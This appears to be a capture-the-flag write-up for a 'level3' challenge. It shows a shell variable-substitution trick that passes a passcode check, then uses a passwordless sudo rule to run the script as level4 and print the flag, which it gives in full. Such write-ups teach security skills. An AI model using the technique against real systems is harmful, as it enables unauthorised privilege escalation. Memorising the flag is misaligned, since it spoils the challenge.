* Exploit read command and variable substitution by entering x for input so that $input becomes $x.
```
$ /home/level3/passcodes.sh
Input the random number.
x
AWESOME sauce
cat: flag.txt: Permission denied
```
* ls -la
```
total 32
dr-xr-x--x 1 level3 level3 4096 Apr  3 16:00 .
drwxr-xr-x 1 root   root   4096 Apr  3 15:35 ..
-rw-r--r-- 1 level3 level3  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level3 level3 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level3 level3  807 Apr  4  2018 .profile
-r--r----- 1 level4 level4   30 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level4 level3  179 Apr  1 21:25 passcodes.sh

```
* sudo -l
```
Matching Defaults entries for level3 on da012872fddc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level3 may run the following commands on da012872fddc:
    (level4) NOPASSWD: /home/level3/passcodes.sh
```
* So the script `/home/level3/passcodes.sh` can be run as user - `level4` without a password
* Clearly understand what `sudo` means `Substitute User DO`
* So substitute user `level4` in place `level3` and run the script, you will get the flag
* Run `sudo -u level4 /home/level3/passcodes.sh`
```
Input the random number.
x
AWESOME sauce
auctf{wut_r_d33z_RaNdom_numz}
```

